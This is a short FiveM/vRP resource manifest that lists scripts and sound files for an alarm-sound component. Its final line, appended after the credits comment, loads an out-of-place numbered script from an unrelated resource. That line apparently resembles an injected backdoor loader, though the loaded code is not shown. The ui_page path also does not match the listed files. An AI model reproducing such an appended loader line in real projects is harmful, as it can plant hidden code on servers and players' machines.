dependency "vrp"

client_scripts{ 
  "client.lua",
  "aClient.lua",
  "InteractSound/client/main.lua",
}
  
server_scripts{ 
  "@vrp/lib/utils.lua",
  "server.lua",
  "InteractSound/server/main.lua",
}

ui_page("InteractSoundclient/client/html/index.html")

files({
  "InteractSound/client/html/index.html",
  "InteractSound/client/html/sounds/allarm.ogg",
})

------
-- InteractSound by Scott
-- Verstion: v0.0.1
------


client_script "@vrp_basic_quest/69.lua"